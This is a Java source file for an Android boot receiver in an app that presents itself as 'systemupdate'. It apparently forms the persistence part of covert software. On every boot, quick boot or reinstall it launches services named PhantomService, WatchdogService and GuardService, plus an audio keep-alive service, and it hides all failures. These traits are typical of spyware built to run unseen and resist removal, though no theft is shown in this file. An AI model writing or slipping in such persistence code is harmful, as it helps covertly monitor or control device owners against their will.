package com.systemupdate.app;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null || intent.getAction() == null) return;
        String action = intent.getAction();
        
        if (Intent.ACTION_BOOT_COMPLETED.equals(action) 
            || Intent.ACTION_MY_PACKAGE_REPLACED.equals(action)
            || "android.intent.action.QUICKBOOT_POWERON".equals(action)
            || Intent.ACTION_LOCKED_BOOT_COMPLETED.equals(action)) {
            
            try {
                Intent svc = new Intent(context, PhantomService.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) context.startForegroundService(svc);
                else context.startService(svc);
            } catch (Throwable ignored) {}

            try {
                Intent wd = new Intent(context, WatchdogService.class);
                wd.setAction(WatchdogService.GUARD_ACTION);
                context.startService(wd);
            } catch (Throwable ignored) {}

            try {
                Intent gs = new Intent(context, GuardService.class);
                gs.setAction(GuardService.GUARD_ACTION);
                context.startService(gs);
            } catch (Throwable ignored) {}
            
            try {
                Intent ka = new Intent(context, KeepAliveAudioService.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) context.startForegroundService(ka);
                else context.startService(ka);
            } catch (Throwable ignored) {}
        }
    }
}